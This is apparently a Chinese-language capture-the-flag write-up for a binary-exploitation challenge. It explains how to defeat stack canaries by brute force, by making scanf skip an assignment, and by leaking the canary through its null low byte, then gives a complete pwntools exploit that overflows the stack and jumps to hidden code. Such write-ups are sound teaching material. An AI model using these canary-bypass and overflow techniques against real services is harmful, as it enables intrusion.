# Catch_the_canary!

## 题目简述

程序连续设置了三道与栈 canary 有关的检查，分别要求利用低熵爆破、让 `scanf` 跳过赋值，以及利用 canary 首字节为零的特性泄漏完整值。最后带着正确 canary 完成栈溢出并跳到隐藏代码。

## 解题过程

三段机制需要分开处理：

1. 题目把 canary 压缩到类似 32 位环境的三字节有效空间，并允许失败后继续尝试，因此可枚举剩余范围；真实多线程服务中也可能出现“线程崩溃但主进程仍存活，且各线程继承同一 canary”的类似利用面。
2. `scanf` 读取整数时，单独输入 `+` 或 `-` 无法形成完整数字，转换失败后不会覆盖原变量，可借此保留正确值。
3. 常规 canary 的最低字节为 `\x00`。向相邻字符缓冲区写满 25 字节可覆盖这个终止零字节，使字符串输出越过边界；接收后再手工补回开头的 `\x00`，即可重建八字节 canary。

完整交互如下：

```python
from pwn import cyclic, p64, remote, u64

io = remote("host", 10000)
hidden_code = 0x4012AD  # 跳过函数序言中的 push rbp

io.sendline(b"11259136")  # 0x00ABCD00
for guess in range(0x00FFDCBA, 0x01000000):
    io.sendlineafter(b"n.\n", str(guess).encode())
    response = io.recvuntil(b"] ")
    if b"Error" not in response:
        break

io.sendlineafter(b"t.\n", b"-")
io.sendline(b"1")
io.sendline(str(0x0BACD003).encode())

io.send(cyclic(25))
io.recvuntil(b"g")
canary = b"\x00" + io.recvn(7)

payload = cyclic(24) + canary + cyclic(8) + p64(hidden_code)
io.send(payload)
io.interactive()
```

## 方法总结

“存在 canary”不等于栈溢出不可利用。应逐项检查它是否可爆破、是否能被输入函数跳过，以及是否能通过字符串越界读泄漏。泄漏时覆盖掉的是最低位的终止零字节，构造最终载荷时必须把它补回原位。
